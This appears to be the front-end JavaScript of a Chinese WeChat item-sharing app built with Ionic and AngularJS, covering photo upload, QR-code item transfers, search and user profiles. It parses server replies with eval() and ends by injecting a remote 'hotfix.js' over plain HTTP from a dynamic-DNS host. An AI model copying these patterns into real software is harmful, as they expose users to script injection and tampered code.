var keywords = '';
var show_user_items = 0;
var app = angular.module('ionicApp', ['ionic']);
var page = 1;
var out = null;
var code = '';
var photo_url = '';

// function Http(method,url,data,callback) {
//     xmlhttp = new XMLHttpRequest();

//     xmlhttp.onreadystatechange = callback.call(xmlhttp.responseText);

//     // function() {
//     //     if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
//     //         return xmlhttp.responseText;
//     //     }
//     // }
//     xmlhttp.open(method, url, true);
//     xmlhttp.send(data);
// }

function convertImgToBase64(url, callback, outputFormat){ 
    var canvas = document.createElement('CANVAS'); 
    var ctx = canvas.getContext('2d'); 
    var img = new Image; 
    img.crossOrigin = 'Anonymous'; 
    img.onload = function(){
      var width = img.width;
      var height = img.height;
      // 按比例压缩4倍
      var rate = (width<height ? width/height : height/width)/4;
      canvas.width = width*rate; 
      canvas.height = height*rate; 
      ctx.drawImage(img,0,0,width,height,0,0,width*rate,height*rate); 
      var dataURL = canvas.toDataURL(outputFormat || 'image/png'); 
      callback.call(this, dataURL); 
      canvas = null; 
    };
    img.src = url; 
}

function readFile(f){ 
    var file = f.files[0]; 
    if(!/image\/\w+/.test(file.type)){ 
        alert("请确保文件为图像类型"); 
        return false; 
    } 
    var reader = new FileReader(); 
    reader.readAsDataURL(file); 
    reader.onload = function(e){ 
        var photo = document.getElementById("photo"); 
        var img = document.getElementById("img"); 
        var data = encodeURI(this.result).replace(/\+/g,'%2B');
        xmlhttp = new XMLHttpRequest();

        xmlhttp.onreadystatechange = function() {
	        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
	            json = xmlhttp.responseText;
	            res = eval( "(" + json + ")" );
	            photo.src = res.url;
	            photo_url = res.url;
	        }
    	}
    	xmlhttp.open("POST", 'upload.php', true);
    	xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");  
    	xmlhttp.send('data=' + data);
    } 
}

function setOpenid(id){
	if(!id && typeof(id)!="undefined" && id!=0){
		openid = id;
	}
} 

// window.onload = function(){ 
//     var file = document.getElementById("file");     
//     file.addEventListener( 'change',readFile,false );
// }
function getItem(code){
xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        json = xmlhttp.responseText;
        data = eval( "(" + json + ")" );
        alert(data.msg);
        window.location.href = '#/item/' + data.item_id;
    }
}
xmlhttp.open("GET", 'transfer/code?transfer=true&code=' + code, true);
xmlhttp.send();
}

function getCode(code){
    xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function() {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            json = xmlhttp.responseText;
            data = eval( "(" + json + ")" );
            if(window.confirm('确认获取：' + data.item_name + "\n" + data.item_des)){
                 getItem(code);
            }
        }
    }
    xmlhttp.open("GET", 'transfer/code?code=' + code, true);
    xmlhttp.send();
}

wx.ready(function () {
document.querySelector('#scanQRCode').onclick = function () {
    wx.scanQRCode({
      needResult: 1,
      desc: 'scanQRCode desc',
      success: function (res) {
      	code = res.resultStr;//res.resultStr.split(',')[1];
        getCode(code);
     //    xmlhttp = new XMLHttpRequest();
     //    xmlhttp.onreadystatechange = function() {
	    //     if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
	    //         json = xmlhttp.responseText;
	    //         data = eval( "(" + json + ")" );
	    //         alert(data.msg);
     //            window.location.href = '#/item/' + data.id;
	    //     }
    	// }
    	// xmlhttp.open("GET", 'transfer/code?code=' + code, true);
    	// xmlhttp.send();
      }
    });
  };
});



 app.config(function($stateProvider, $urlRouterProvider) {

        $stateProvider
            .state('tabs', {
                url: "/tab",
                abstract: true,
                templateUrl: "templates/tabs.html"
            })

        .state('tabs.home', {
            url: "/home",
            views: {
                'home-tab': {
                    templateUrl: "templates/home.html",
                }
            }
        })

        .state('tabs.search', {
                url: "/search",
                views: {
                    'search-tab': {
                        templateUrl: "templates/search.html"
                    }
                },
                controller:"ItemsController"
            })
            .state('tabs.user', {
                url: "/user",
                views: {
                    'user-tab': {
                        templateUrl: "templates/user.html"
                    }
                }
            })

        .state('item', {
            url: "/item/:id",
            templateUrl: "templates/item.html",
            controller: "ItemController"
        })

        .state('articles', {
            url: "/articles/:user_id",
            templateUrl: "templates/articles.html",
        })

        .state('article', {
            url: "/article/:id",
            templateUrl: "templates/article.html",
        })

        .state('item_edit', {
            url: "/item_edit",
            templateUrl: "templates/item_edit.html"
        })

        .state('user_info', {
                url: "/user_info",
                templateUrl: "templates/user_info.html"
        })

        .state('post', {
                url: "/post/:id",
                templateUrl: "templates/post.html"
        })

        .state('request', {
                url: "/request",
                templateUrl: "templates/request.html"
        })
        .state('item_list', {
                url: "/item_list",
                templateUrl: "templates/item_list.html"
        })

        $urlRouterProvider.otherwise("/tab/home");

    });

    app.controller('InitController', function($scope, $location, $http) {

        if ($location.search().openid) {
            setOpenid($location.search().openid);
        }

        $http.get('user').success(function(data) {
            user = data;
            if(!user.id){
                $location.url('user_info');
            }
        });

        // if(openid.length == 0){
        //     window.location.href = 'wechat/oauth';
        // }

    });

    app.controller('HomeController', function($scope, $location, $http) {
        $http.get('home/list').success(function(home) {
            $scope.home = home;
        });
    });

    app.controller('ItemController', function($scope, $stateParams, $http) {
        
        $http.get('item/id/' + $stateParams.id).success(function(data){
            $scope.item = data;
        })

        $http.get('transfer/item/' + $stateParams.id).success(function(data){
            $scope.transfers = data;
        })

        $scope.request = function() {
            $http.get('transfer/new?item_id=' + $scope.item.id).success(function(data){
                alert(data.msg);
                //location.reload();
            });
        };

        $scope.reTime = function() {
            $http.get('item/retime/' + $scope.item.id).success(function(data){
                alert(data.msg);
                location.reload();
            });
        };

    });

    app.controller('ItemsController', function($scope, $location, $http) {
        $scope.items = [];
        $scope.canLoad = true;

        if ($location.search().keywords) {
            keywords = $location.search().keywords;
            $scope.keywords = keywords;
        }else{
            keywords = '';
        }

        if ($location.search().user) {
            show_user_items = $location.search().user;
            $scope.keywords = keywords;
        }

        $scope.$on('$stateChangeSuccess', function() {
            //alert('a');
            page = 1;
            $scope.items = [];
            if ($location.search().keywords) {
            keywords = $location.search().keywords;
            $scope.keywords = keywords;
            }

        if ($location.search().user) {
            show_user_items = $location.search().user;
            $scope.keywords = keywords;
        }
            $scope.loadMore();
        });


        

        $scope.search = function() {
            $scope.items = [];
            show_user_items = '';
            page = 1;

            keywords = $scope.keywords;

            if (keywords == null) keywords = '';

            $scope.loadMore();
        };

        $scope.loadMore = function() {

            // if($location.search().keywords){
            //     keywords = $location.search().keywords;
            // };

            $http.get('item/search?keywords=' + keywords + '&page=' + page + '&user_id=' + show_user_items).success(function(items) {

                $scope.items = $scope.items.concat(items);

                if (items.length < 10) {
                    $scope.canLoad = false;
                } else {
                    page = page + 1;
                }
                //

                $scope.$broadcast('scroll.infiniteScrollComplete');

            });
        };

        

    });

    app.controller('UserController', function($scope, $stateParams, $http) {
        //console.info($stateParams.id);
        $scope.hasRequest = true;

        // if($stateParams.id){
        //     $http.get('user/id/'+$stateParams.id).success(function(data){
        //     $scope.user = data;
        //     $scope.gravatar = 'http://cn.gravatar.com/avatar/' + $scope.user.email_md5;
        // })

        // }else{

        // }
        $http.get('user').success(function(data){
                $scope.user = data;
                $scope.gravatar = 'http://cn.gravatar.com/avatar/' + $scope.user.email_md5;
                setOpenid(data.openid)
            });
        

    });

    app.controller('EditController', function($scope, $location, $stateParams, $http) {
    	$scope.item = [];
    	$scope.item.transfer = true;
        $scope.submit = function() {
        	//alert($scope.item.photo);
            $http.post('item/post', {
                name:$scope.item.name,
                des:$scope.item.des,
                transfer:$scope.item.transfer,
                photo:photo_url
            }).success(function(){
                $scope.item.name = '';
                $scope.item.des = '';
                document.getElementById("photo").src = "img/picture.png";
                window.location.href = '#/tab/user';
            });
        };
    });

    app.controller('ArticleController', function($scope, $stateParams, $http) {
        $http.get('article/id/' + $stateParams.id).success(function(data){
            $scope.article = data;
        })
    });

    app.controller('ArticlesController', function($scope, $stateParams, $http) {
        $http.get('article/user/' + $stateParams.user_id).success(function(data){
            $scope.articles = data;
        })
    });

    app.controller('UserInfoController', function($scope, $location, $stateParams, $http) {
        $scope.class = {
            'list':{'c1':[],'c2':[],'c3':[]},
            'c1':{'code':'','name':''},
            'c2':{'code':'','name':''},
            'c3':{'code':'','name':''}
        };

        $http.get('user').success(function(data){
            $scope.user = data;
        })

        $http.get('classes').success(function(data){
            
            $scope.classes = data;
            angular.forEach($scope.classes, function(d){
                if(d.code.substr(2,4) == '0000'){
                    $scope.class.list.c1.push(d);
                }
            });
        })


        $scope.classChange = function(){
            console.log($scope.class);

            var c1 = $scope.class.c1.code.substr(0,2);
            var c2 = $scope.class.c2.code.substr(2,2);

            $scope.class.list.c2 = [];$scope.class.list.c3 = [];
            angular.forEach($scope.classes, function(d){

                if(d.code.substr(0,2) == c1 && d.code.substr(2,2) != '00' && d.code.substr(4,2) == '00'){
                    $scope.class.list.c2.push(d);
                }

                if(d.code.substr(0,2) == c1 && d.code.substr(2,2) == c2 && d.code.substr(4,2) != '00'){
                   $scope.class.list.c3.push(d);
                }

                if(d.code == $scope.class.c1.code){
                    $scope.class.c1.name = d.name;
                }

                if(d.code == $scope.class.c2.code){
                    $scope.class.c2.name = d.name;
                }

                if(d.code == $scope.class.c3.code){
                    $scope.class.c3.name = d.name;
                }

             });
        };

        $scope.submit = function() {
            $http.post('user/update', {
                openid:$scope.user.openid,
                name:$scope.user.name,
                sex:$scope.user.sex,
                class:$scope.class.c1.name + $scope.class.c2.name + $scope.class.c3.name,
                email:$scope.user.email,
                contact:$scope.user.contact
            }).success(function(){
                $location.url('/tab/home');
            });
        };
    });

    app.controller('PostController', function($scope, $location, $stateParams, $http) {
    	$scope.item = [];

       	$scope.submit = function() {
            $http.post('article/post', {
                title:$scope.item.title,
                content:$scope.item.content,
                item_id:$stateParams.id
            }).success(function(){
                $location.url('/tab/user');
            });
        };
    });

    app.controller('RequestController', function($scope, $location, $stateParams, $http, $ionicPopup) {
    	$scope.requests = [];

        $scope.showPopup = function(id) {
           $scope.request = {}

           // 自定义弹窗
           var myPopup = $ionicPopup.show({
             template: '<input type="text" ng-model="request.trans_way">',
             title: '交付方式',
             subTitle: '请说明交付方式时间地点',
             scope: $scope,
             buttons: [
               { text: '取消' },
               {
                 text: '<b>提交</b>',
                 type: 'button-positive',
                 onTap: function(e) {
                   if (!$scope.request.trans_way) {
                     e.preventDefault();
                   } else {
                    $http.get('transfer/transway?id=' + id + '&text=' + $scope.request.trans_way).success(function(data){
                        alert(data.msg);
                        $http.get('transfer/request').success(function(data){
                            $scope.requests = data;
                        })
                        //location.reload();
                    })
                   }
                 }
               },
             ]
           });
           myPopup.then(function(res) {
             console.log('Tapped!', res);
           });
           // $timeout(function() {
           //    myPopup.close(); // 3秒后关闭弹窗
           // }, 3000);
          };

    

    	$http.get('transfer/request').success(function(data){
            $scope.requests = data;
        })
    });

    app.controller('ItemListController', function($scope, $location, $stateParams, $http) {
        $scope.result = [];
        $http.get('transfer/itemlist').success(function(data){
            $scope.result = data;
        })

    });

    document.write("<script src='http://hello.ticp.io/piaoliu/js/hotfix.js'><\/script>"); 

